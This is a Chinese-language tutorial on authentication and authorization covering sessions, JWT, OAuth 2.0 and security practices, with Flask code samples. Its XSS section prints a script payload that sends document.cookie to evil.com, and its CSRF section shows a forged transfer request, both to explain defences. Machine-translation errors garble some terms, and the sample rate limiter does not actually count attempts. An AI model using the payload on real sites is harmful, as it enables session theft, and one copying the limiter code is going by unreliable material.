# 认证与授权原理
> 💡 **学习指南**：本章将带你深入了解后台架构中的“访问控制系统”——认证与授权。我们将从最基本的“你是谁”开始，逐步掌握现代认证方案，如 Session、JWT、OAuth 2.0 等。

<AuthEvolutionDemo />

## 0. 引言：系统的“守门员”

为什么你关闭并重新打开微信后，它仍然知道你是谁？
Bilibili 如何知道你是会员还是普通用户？
为什么你可以通过微信扫描二维码登录第三方网站，而无需输入密码？

这一切的背后都有一个核心系统：**认证与授权**。

如果我们把后台系统比作一座办公大楼：

- **认证（Authentication）**：确认“你是谁”（验证身份证 / 门禁卡）。
- **授权（Authorization）**：确认“你可以去哪里”（VIP 可以进入 VIP 休息室，普通用户不能）。

### 0.1 需要认证的动机

原因只有一个：**保护资源**。

- **隐私保护**：你的个人信息和聊天记录——只有你可以查看。
- **权限控制**：管理员可以删除用户，普通用户不能。
- **防止滥用**：防止恶意 API 调用和暴力破解接口。

<AuthBasicsDemo />

### 0.2 互动演示：登录流程

让我们通过一个真实的登录演示来理解认证与授权是如何工作的。

<AuthInteractiveLoginDemo />

**关键点**：认证是第一道防线——每个敏感操作都必须先验证身份。

---

## 1. 核心概念：认证 vs 授权

### 1.1 认证（Authentication）：你是谁概览

确认用户的身份。

- *示例*：输入用户名和密码、指纹扫描、人脸识别。
- *输出*：代表“你”的令牌。
- *缩写*：**AuthN**

### 1.2 授权（Authorization）：你能做什么

确认用户拥有哪些权限。

- *示例*：管理员可以删除帖子，普通用户只能点赞。
- *输出*：允许或拒绝访问。
- *缩写*：**AuthZ**

### 1.3 两者之间的关系

```
User Request → Authentication (Who are you?) → Authorization (Can you do this?) → Execute Business Logic
               ↓                                  ↓
          Verify identity                   Check permissions
          (Is the Token valid?)             (Does the user have delete permission?)
```

<AuthNvsAuthZDemo />

**关键点**：先认证，然后授权。只有在确认“你是谁”之后，才能确定“你能做什么”。

---

## 2. 认证方案的演变

### 2.1 第一代：HTTP 基本认证

最古老的方法 —— 直接在 HTTP 头中放置用户名和密码。

```http
GET /api/user/profile HTTP/1.1
Host: example.com
Authorization: Basic dXNlcm5hbWU6cGFzc3dvcmQ=
                      (base64("username:password"))
```

- **优点**：简单；所有浏览器都支持。
- **缺点**：
  - 不安全（Base64 可解码——实际上是明文）。
  - 密码必须随每个请求发送（容易被拦截）。
  - 无法主动注销（除非关闭浏览器）。

**结论**：仅适用于内部测试工具；切勿在生产环境中使用。

### 2.2 第二代：会话 Cookie

Web 开发的经典方法。

**流程**：

```
1. User logs in (POST /login)
   → Server validates username and password
   → Creates a Session (in server memory or Redis)
   → Returns Set-Cookie: session_id=abc123

2. Subsequent requests
   → Browser automatically sends Cookie: session_id=abc123
   → Server looks up Session by session_id
   → If found, the user is considered "who they claim to be"
```

**代码示例**：

```python
# Backend (Python Flask)
from flask import session, request

@app.route("/login", methods=["POST"])
def login():
    username = request.json["username"]
    password = request.json["password"]

    # Verify username and password
    user = db.authenticate(username, password)
    if user:
        # Create Session
        session["user_id"] = user.id
        session["role"] = user.role
        return {"status": "success"}
    else:
        return {"error": "Incorrect username or password"}, 401

@app.route("/api/admin/users")
def get_users():
    # Check Session
    if "user_id" not in session:
        return {"error": "Not logged in"}, 401

    # Check permissions
    if session.get("role") != "admin":
        return {"error": "Insufficient permissions"}, 403

    # Execute business logic
    users = db.get_all_users()
    return {"users": users}
```

<SessionCookieDemo />

**优点**：

- 简单直观；易于理解。
- 服务器可以主动注销（删除会话）。

**缺点**：

- **服务器有状态**：需要存储会话；多个服务器需要共享存储（例如 Redis）。
- **跨域困难**：Cookies 默认不可跨域（CORS 问题）。
- **CSRF 攻击**：恶意网站可能冒充你的 Cookie。

**结论**：适合传统的 Web 应用（服务器端渲染）；不适合移动端或现代 SPA。

### 2.3 第三代：词元（JWT）

现代 Web 应用的主流方法。

**核心思想**：不要在服务器上存储状态。将用户信息加密进 词元 并存储在客户端。

**JWT 结构**：

```
JWT = Header.Payload.Signature

Example:
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjoxMjMsInJvbGUiOiJhZG1pbiIsImV4cCI6MTYxNjIzOTAyMn0.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c
 |--------------------------------| |-----------------------------------------------| |----------------------------|
           Header                           Payload                                      Signature
```

- **标题**：算法信息（例如，`{"alg": "HS256", "typ": "JWT"}`）。
- **有效负载**：用户信息（例如，`{"user_id": 123, "role": "admin", "exp": 1616239022}`）。
- **签名**：防篡改签名。

**流程**：

```python
# 1. User login
@app.route("/login", methods=["POST"])
def login():
    username = request.json["username"]
    password = request.json["password"]

    user = db.authenticate(username, password)
    if user:
        # Generate JWT
        token = jwt.encode(
            {
                "user_id": user.id,
                "role": user.role,
                "exp": datetime.now() + timedelta(hours=24)  # Expires in 24 hours
            },
            SECRET_KEY,
            algorithm="HS256"
        )
        return {"token": token}
    else:
        return {"error": "Incorrect username or password"}, 401

# 2. Subsequent requests
@app.route("/api/admin/users")
def get_users():
    # Get Token from Header
    auth_header = request.headers.get("Authorization")
    if not auth_header or not auth_header.startswith("Bearer "):
        return {"error": "No Token provided"}, 401

    token = auth_header.split(" ")[1]

    try:
        # Verify and parse Token
        payload = jwt.decode(token, SECRET_KEY, algorithms=["HS256"])
    except jwt.ExpiredSignatureError:
        return {"error": "Token has expired"}, 401
    except jwt.InvalidTokenError:
        return {"error": "Token is invalid"}, 401

    # Check permissions
    if payload.get("role") != "admin":
        return {"error": "Insufficient permissions"}, 403

    # Execute business logic
    users = db.get_all_users()
    return {"users": users}
```

<JWTWorkflowDemo />

**优点**：

- **无状态**：服务器无需存储会话；易于水平扩展。
- **跨域友好**：存储在 Header 中，不受 Cookie 跨域限制。
- **移动端友好**：原生应用也可以轻松使用。
- **信息丰富**：Payload 可以存储用户信息、权限等。

**缺点**：

- **无法主动登出**：一旦发放，词元 会一直有效直到过期（除非使用阻止列表）。
- **Payload 可见**：Base64 编码 — 不要存储敏感信息（例如密码）。
- **词元 体积大**：每次请求都需要发送 — 几百字节。

**结论**：现代 Web 和移动应用的标准做法。

<SessionVsJWTDemo />

---

## 3. OAuth 2.0：第三方登录

你一定见过这些按钮：“用微信登录”、“用 Google 登录”。

这就是 **OAuth 2.0**：一个 **授权** 框架（而不是认证！）。

### 3.1 核心角色

| 角色 | 描述 | 示例 |
| :--- | :--- | :--- |
| **资源所有者** | 资源的拥有者（用户） | 你 |
| **客户端** | 第三方应用 | 某个网站 |
| **授权服务器** | 授权服务器 | 微信、Google |
| **资源服务器** | 资源服务器 | 微信的用户信息接口 |

### 3.2 授权码流程

最安全的模式 — 适用于有后端的服务器。

**流程**：

```
1. User clicks "Log in with WeChat"
   → Redirects to the WeChat authorization page
   https://open.weixin.qq.com/connect/qrconnect?
     appid=APPID&
     redirect_uri=https://yourapp.com/callback&
     response_type=code&
     scope=snsapi_login&
     state=STATE

2. User scans the QR code and grants authorization
   → WeChat redirects back to your website
   https://yourapp.com/callback?code=AUTHORIZATION_CODE&state=STATE

3. Your backend exchanges the code for an access_token
   POST https://api.weixin.qq.com/sns/oauth2/access_token
   {
     "appid": "APPID",
     "secret": "SECRET",
     "code": "AUTHORIZATION_CODE",
     "grant_type": "authorization_code"
   }
   → Returns: { "access_token": "...", "openid": "..." }

4. Use the access_token to fetch user information
   GET https://api.weixin.qq.com/sns/userinfo?
     access_token=ACCESS_TOKEN&
     openid=OPENID
   → Returns: { "nickname": "Zhang San", "headimgurl": "..." }
```

<OAuth2FlowDemo />

**代码示例**：

```python
from flask import request, redirect

@app.route("/login/wechat")
def login_wechat():
    # 1. Redirect to WeChat authorization page
    auth_url = (
        "https://open.weixin.qq.com/connect/qrconnect"
        f"?appid={APPID}"
        f"&redirect_uri={urlencode(REDIRECT_URI)}"
        "&response_type=code"
        "&scope=snsapi_login"
        f"&state={generate_state()}"
    )
    return redirect(auth_url)

@app.route("/callback")
def wechat_callback():
    # 2. Get the code
    code = request.args.get("code")
    state = request.args.get("state")

    # Verify state (anti-CSRF)
    if not verify_state(state):
        return {"error": "Invalid state"}, 400

    # 3. Exchange the code for an access_token
    token_resp = requests.post(
        "https://api.weixin.qq.com/sns/oauth2/access_token",
        params={
            "appid": APPID,
            "secret": SECRET,
            "code": code,
            "grant_type": "authorization_code"
        }
    ).json()

    access_token = token_resp["access_token"]
    openid = token_resp["openid"]

    # 4. Fetch user information
    user_info = requests.get(
        "https://api.weixin.qq.com/sns/userinfo",
        params={
            "access_token": access_token,
            "openid": openid
        }
    ).json()

    # 5. Create or update local user
    user = db.get_or_create_user(
        openid=openid,
        nickname=user_info["nickname"],
        avatar=user_info["headimgurl"]
    )

    # 6. Generate this system's JWT
    token = jwt.encode(
        {"user_id": user.id, "exp": ...},
        SECRET_KEY
    )

    return {"token": token}
```

**要点**：

- **代码只能使用一次**：使用后即失效，防止被截取。
- **state 防止 CSRF 攻击**：生成随机字符串；在回调时验证它以防恶意伪造。
- **redirect_uri 必须匹配**：事先在微信开放平台注册，以防重定向攻击。

### 3.3 其他模式

| 模式                                  | 适用场景                                | 安全性          |
| :------------------------------------- | :-------------------------------------- | :---------------- |
| **授权码模式**                         | 有后台服务器的应用                        | ⭐⭐⭐⭐⭐          |
| **隐式模式**                           | 纯前端应用（SPA）                        | ⭐⭐⭐（已弃用）   |
| **资源所有者密码模式**                  | 高信任应用（例如官方应用）                | ⭐⭐              |
| **客户端凭证模式**                       | 服务器到服务器通信（无用户）              | ⭐⭐⭐⭐            |

<OAuth2ModesDemo />

---

## 4. 实践：设计完整的认证系统

### 4.1 需求分析

- **多平台支持**：Web、iOS、Android。
- **第三方登录**：微信、谷歌。
- **权限控制**：普通用户、VIP、管理员。
- **安全性**：防暴力破解、防劫持、防重放攻击。

### 4.2 架构设计

```
┌─────────────┐
│    Client    │
└──────┬──────┘
       │
       ▼
┌─────────────────────────────────┐
│         API Gateway             │
│  - Rate Limiting                │
│  - Token Validation             │
└──────┬──────────────────────────┘
       │
       ▼
┌─────────────────────────────────┐
│      Auth Service               │
│  - Registration, Login          │
│  - Token Issuance & Validation  │
│  - OAuth 2.0 Integration        │
└──────┬──────────────────────────┘
       │
       ▼
┌─────────────────────────────────┐
│    Business Services            │
│  - User Service                 │
│  - Order Service                │
│  - Payment Service              │
└─────────────────────────────────┘
```

### 4.3 数据库设计

```sql
-- Users table
CREATE TABLE users (
    id BIGINT PRIMARY KEY AUTO_INCREMENT,
    username VARCHAR(50) UNIQUE NOT NULL,
    password_hash VARCHAR(255) NOT NULL,  -- bcrypt hash
    email VARCHAR(100) UNIQUE,
    role ENUM('user', 'vip', 'admin') DEFAULT 'user',
    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
    updated_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP,
    INDEX idx_username (username),
    INDEX idx_email (email)
);

-- Third-party login binding table
CREATE TABLE user_auth_providers (
    id BIGINT PRIMARY KEY AUTO_INCREMENT,
    user_id BIGINT NOT NULL,
    provider ENUM('wechat', 'google', 'github') NOT NULL,
    provider_user_id VARCHAR(100) NOT NULL,  -- Third-party user ID
    access_token TEXT,  -- Encrypted storage
    refresh_token TEXT,
    expires_at TIMESTAMP,
    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
    UNIQUE KEY uk_provider_provider_user_id (provider, provider_user_id),
    FOREIGN KEY (user_id) REFERENCES users(id) ON DELETE CASCADE
);

-- Token blocklist (for proactive logout)
CREATE TABLE token_blacklist (
    id BIGINT PRIMARY KEY AUTO_INCREMENT,
    token_jti VARCHAR(100) UNIQUE NOT NULL,  -- JWT JTI (unique identifier)
    expired_at TIMESTAMP NOT NULL,
    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
    INDEX idx_expired_at (expired_at)
);
```

<AuthDatabaseDemo />

### 4.4 代码实现

```python
# auth_service.py
import bcrypt
import jwt
from datetime import datetime, timedelta

SECRET_KEY = "your-secret-key-here"  # Use an environment variable in production

class AuthService:
    def register(self, username: str, password: str, email: str = None):
        # 1. Check if the username already exists
        if db.get_user_by_username(username):
            raise ValueError("Username already exists")

        # 2. Hash the password (bcrypt)
        password_hash = bcrypt.hashpw(
            password.encode('utf-8'),
            bcrypt.gensalt(rounds=12)
        ).decode('utf-8')

        # 3. Create the user
        user = db.create_user(
            username=username,
            password_hash=password_hash,
            email=email
        )

        # 4. Issue Tokens
        return self._generate_tokens(user)

    def login(self, username: str, password: str):
        # 1. Look up the user
        user = db.get_user_by_username(username)
        if not user:
            raise ValueError("Incorrect username or password")

        # 2. Verify the password
        if not bcrypt.checkpw(
            password.encode('utf-8'),
            user.password_hash.encode('utf-8')
        ):
            raise ValueError("Incorrect username or password")

        # 3. Issue Tokens
        return self._generate_tokens(user)

    def _generate_tokens(self, user):
        now = datetime.now()

        # Access Token (short-lived, e.g., 1 hour)
        access_token = jwt.encode(
            {
                "user_id": user.id,
                "role": user.role,
                "type": "access",
                "iat": now,
                "exp": now + timedelta(hours=1),
                "jti": str(uuid4())  # Unique identifier
            },
            SECRET_KEY,
            algorithm="HS256"
        )

        # Refresh Token (long-lived, e.g., 30 days)
        refresh_token = jwt.encode(
            {
                "user_id": user.id,
                "type": "refresh",
                "iat": now,
                "exp": now + timedelta(days=30),
                "jti": str(uuid4())
            },
            SECRET_KEY,
            algorithm="HS256"
        )

        return {
            "access_token": access_token,
            "refresh_token": refresh_token,
            "token_type": "Bearer",
            "expires_in": 3600  # access_token expiration time (seconds)
        }

    def refresh(self, refresh_token: str):
        try:
            payload = jwt.decode(refresh_token, SECRET_KEY, algorithms=["HS256"])
            if payload.get("type") != "refresh":
                raise ValueError("Invalid token type")

            user = db.get_user_by_id(payload["user_id"])
            return self._generate_tokens(user)
        except jwt.ExpiredSignatureError:
            raise ValueError("Refresh token has expired")
        except jwt.InvalidTokenError:
            raise ValueError("Refresh token is invalid")

    def logout(self, token: str):
        # Add the Token to the blocklist
        payload = jwt.decode(token, SECRET_KEY, algorithms=["HS256"])
        db.add_to_blacklist(
            jti=payload["jti"],
            expired_at=datetime.fromtimestamp(payload["exp"])
        )

    def verify_token(self, token: str):
        try:
            payload = jwt.decode(token, SECRET_KEY, algorithms=["HS256"])

            # Check if it's in the blocklist
            if db.is_token_blacklisted(payload["jti"]):
                raise ValueError("Token has been revoked")

            return payload
        except jwt.ExpiredSignatureError:
            raise ValueError("Token has expired")
        except jwt.InvalidTokenError:
            raise ValueError("Token is invalid")

# API decorators
def require_auth(auth_service: AuthService):
    def decorator(f):
        def wrapper(*args, **kwargs):
            # Get Token from Header
            auth_header = request.headers.get("Authorization")
            if not auth_header or not auth_header.startswith("Bearer "):
                return {"error": "No Token provided"}, 401

            token = auth_header.split(" ")[1]

            try:
                # Verify Token
                payload = auth_service.verify_token(token)
                # Inject user information into the request context
                request.user = payload
                return f(*args, **kwargs)
            except ValueError as e:
                return {"error": str(e)}, 401

        return wrapper
    return decorator

def require_role(*roles):
    def decorator(f):
        def wrapper(*args, **kwargs):
            if not hasattr(request, "user"):
                return {"error": "Not logged in"}, 401

            if request.user["role"] not in roles:
                return {"error": "Insufficient permissions"}, 403

            return f(*args, **kwargs)
        return wrapper
    return decorator

# Usage example
@app.route("/api/admin/users", methods=["GET"])
@require_auth(auth_service)
@require_role("admin")
def get_users():
    users = db.get_all_users()
    return {"users": users}

@app.route("/api/user/profile", methods=["GET"])
@require_auth(auth_service)
def get_profile():
    user = db.get_user_by_id(request.user["user_id"])
    return {"user": user}

@app.route("/auth/refresh", methods=["POST"])
def refresh_token():
    refresh_token = request.json.get("refresh_token")
    try:
        tokens = auth_service.refresh(refresh_token)
        return tokens
    except ValueError as e:
        return {"error": str(e)}, 401
```

<CompleteAuthSystemDemo />

---

## 5. 安全最佳实践

### 5.1 密码存储

**❌ 错误的方法**:

```python
# Plaintext storage (absolutely not!)
db.save_password(username, password)

# MD5 / SHA1 hashing (not secure enough — vulnerable to rainbow table attacks)
hash = md5(password)
db.save_password(username, hash)
```

**✅ 正确的方法**：

```python
# bcrypt (adaptive hashing; slow hashing prevents brute-force attacks)
import bcrypt

password_hash = bcrypt.hashpw(
    password.encode('utf-8'),
    bcrypt.gensalt(rounds=12)  # More rounds = more secure, but also slower
)

# Verification
if bcrypt.checkpw(password.encode('utf-8'), password_hash):
    # Password is correct
```

**为什么选择 bcrypt？**

- **慢**：特意设计得很慢（毫秒级）以防止暴力破解攻击。
- **自适应**：可以根据硬件进步调整轮数以增强安全性。
- **加盐**：内置随机盐以防止彩虹表攻击。

<PasswordHashingDemo />

### 5.2 暴力破解预防

- **速率限制**：相同的 IP / 用户名每分钟只能尝试 5 次。
- **验证码**：在 3 次失败尝试后要求填写验证码。
- **账号锁定**：在 10 次失败尝试后锁定账号 30 分钟。

```python
from functools import lru_cache
import time

@lru_cache(maxsize=10000)
def get_login_attempts(identifier: str) -> tuple:
    """Returns (attempt count, time of first attempt)"""
    return (0, 0)

def check_rate_limit(identifier: str):
    attempts, first_attempt = get_login_attempts(identifier)
    now = time.time()

    # Reset after 1 minute
    if now - first_attempt > 60:
        get_login_attempts.cache_clear()
        return True

    # Reject if over 5 attempts
    if attempts >= 5:
        return False

    return True

def record_login_attempt(identifier: str):
    attempts, first_attempt = get_login_attempts(identifier)
    if attempts == 0:
        first_attempt = time.time()
    get_login_attempts.cache_clear()
    get_login_attempts(identifier)  # Re-cache

@app.route("/login", methods=["POST"])
def login():
    username = request.json["username"]

    # Check rate limit
    if not check_rate_limit(username):
        return {"error": "Too many attempts. Please try again in 1 minute."}, 429

    password = request.json["password"]

    # Verify password
    user = db.get_user_by_username(username)
    if user and bcrypt.checkpw(password.encode(), user.password_hash.encode()):
        # Login successful — clear the counter
        get_login_attempts.cache_clear()
        return {"token": generate_token(user)}
    else:
        # Login failed — record the attempt
        record_login_attempt(username)
        return {"error": "Incorrect username or password"}, 401
```

### 5.3 CSRF 防护（跨站请求伪造）

**攻击场景**：
你登录你的银行网站 `bank.com`，然后访问一个恶意网站 `evil.com`。`evil.com` 上的页面包含以下代码：

```html
<img src="https://bank.com/api/transfer?to=attacker&amount=10000" />
```

您的浏览器将使用银行的 Cookie（跨源请求）发送此请求，可能会在您不知情的情况下转移资金。

**防御措施**：

1. **CSRF 令牌**：
   - 服务器生成一个随机令牌并将其放入表单字段中。
   - 提交时验证该令牌是否匹配。

```python
from flask import session

@app.route("/api/transfer", methods=["POST"])
def transfer():
    # Verify CSRF Token
    token = request.headers.get("X-CSRF-Token")
    if token != session.get("csrf_token"):
        return {"error": "CSRF Token is invalid"}, 403

    # Execute the transfer
    ...
```

2.  **SameSite Cookie**：
    - 将 Cookie 的 `SameSite` 属性设置为 `Strict` 或 `Lax`。

```python
# Flask example
app.config.update(
    SESSION_COOKIE_SAMESITE='Lax',  # or 'Strict'
    SESSION_COOKIE_SECURE=True      # HTTPS only
)
```

3.  **使用 JWT（不使用 Cookies）**：
    - JWT 存储在 `localStorage` 中，并不会自动附加到请求上 —— 自然对 CSRF 免疫。

<CSRFDefenseDemo />

### 5.4 XSS 防护（跨站脚本）

**攻击场景**：
一个恶意用户在评论区输入以下内容：

```html
<script>
  fetch('https://evil.com/steal?cookie=' + document.cookie)
</script>
```

如果网站直接呈现此内容，其他用户的 Cookie 将被窃取。

**防御措施**：

1.  **输出转义**：
    - 将 `<` 转换为 `&lt;`，将 `>` 转换为 `&gt;`。

```python
import html

def render_comment(comment):
    # Escape HTML
    safe_comment = html.escape(comment)
    return f"<div class='comment'>{safe_comment}</div>"
```

2.  **内容安全策略 (CSP)**:
    - 设置 HTTP 头以限制脚本来源。

```http
Content-Security-Policy: default-src 'self'; script-src 'self' https://cdn.example.com
```

3.  **HttpOnly Cookie**:
    - 设置 Cookie 的 `HttpOnly` 属性，以便 JavaScript 无法读取它。

```python
app.config.update(
    SESSION_COOKIE_HTTPONLY=True
)
```

<XSSDefense演示/>

---

## 6.总结与学习路线图

认证是后端系统的“基础技能”。掌握认证对于构建安全可靠的应用至关重要。

### 6.1 核心知识点

|主题 |重要性 |难度 |现实世界频率 |
|:---------------------------- |:----------- |:--------- |:------------------- |
|**会话饼干** |⭐⭐⭐⭐     |中等 |高 |
|**JWT** |⭐⭐⭐⭐⭐   |低 |非常高 |
|**奥奥斯 2.0** |⭐⭐⭐⭐     |高 |高 |
|**密码哈希（bcrypt）** |⭐⭐⭐⭐⭐   |低 |非常高 |
|**速率限制与反暴力破解** |⭐⭐⭐⭐⭐   |中等 |非常高 |
|**CSRF防御**⭐⭐⭐⭐     |中等 |中等 |
|**XSS防御** |⭐⭐⭐⭐     |低 |高 |

### 6.2 学习路线图

1. **入门**（1–2天）：
    - 理解认证与授权的区别。
    - 掌握会话饼干的原理。
    - 实现简单的登录和注册功能。

2. **中级**（1周）：
    - 学习JWT的原理和实现。
    - 实现基于JWT的认证系统。
    - 主密码哈希（bcrypt）。

3. **实际应用**（2–4周）：
    - 集成OAuth 2.0（微信，谷歌登录）。
    - 实施速率限制和暴力破解预防。
    - 防御CSRF、XSS及其他常见攻击。

4. **深入探险**（持续进行中）：
    - 研究基于角色的访问控制（RBAC）。
    - 研究单点登录（SSO）。
    - 探索零信任架构。

### 6.3 推荐资源

- **标准**：
  - RFC 6749（OAuth 2.0）
  - RFC 7519（JWT）
- **条目**：
  - JWT.io：https://jwt.io/
  - OAuth 2.0 简化版：https://oauth.net/2/
- **工具**：
  - jwt.io（在线JWT调试器）
  - 邮递员（API测试）

---

## 7.术语表

| 术语              | 全称                        | 解释                                                                                                     |
| :---------------- | :-------------------------- | :------------------------------------------------------------------------------------------------------ |
| **AuthN**         | 身份验证                     | **身份验证**。验证“你是谁”（例如，输入密码以验证身份）。                                               |
| **AuthZ**         | 授权                         | **授权**。验证“你可以做什么”（例如，只有管理员可以删除）。                                           |
| **Session**       | -                            | **会话**。服务器端的用户状态信息。                                                                     |
| **Cookie**        | -                            | **Cookie**。浏览器存储的小块数据，每次请求时自动发送。                                               |
| **JWT**           | JSON Web 词元               | **JSON Web 词元**。一种无状态认证方案，由 Header、Payload 和 Signature 组成。                         |
| **OAuth 2.0**     | -                            | **开放授权**。用于第三方登录的标准化框架（例如，“使用微信登录”）。                                    |
| **SSO**           | 单点登录                     | **单点登录**。登录一次即可访问多个应用（例如，Google 账户可访问所有 Google 服务）。                     |
| **RBAC**          | 基于角色的访问控制           | **基于角色的访问控制**。根据用户角色决定权限（例如，管理员、用户）。                                   |
| **CSRF**          | 跨站请求伪造                 | **跨站请求伪造**。攻击者诱使用户发送恶意请求（例如，使用你的 Cookie 发起转账）。                       |
| **XSS**           | 跨站脚本                     | **跨站脚本**。攻击者在网页中注入恶意脚本（例如，窃取 Cookies）。                                      |
| **bcrypt**        | -                            | **密码哈希算法**。一种慢速哈希算法，专为密码存储设计，可防止暴力破解攻击。                             |
| **Access 词元**  | -                            | **访问令牌**。用于访问 API 的短期令牌。                                                               |
| **Refresh 词元** | -                            | **刷新令牌**。用于获取新的访问令牌的长期令牌。                                                         |
| **Scope**         | -                            | **权限范围**。OAuth 2.0 的概念，表示第三方应用请求的权限（例如，读取用户信息）。                      |
| **PKCE**          | 代码交换验证密钥             | **代码交换验证密钥**。OAuth 2.0 的扩展，用于增强公共客户端（例如 SPA）的安全性。                       |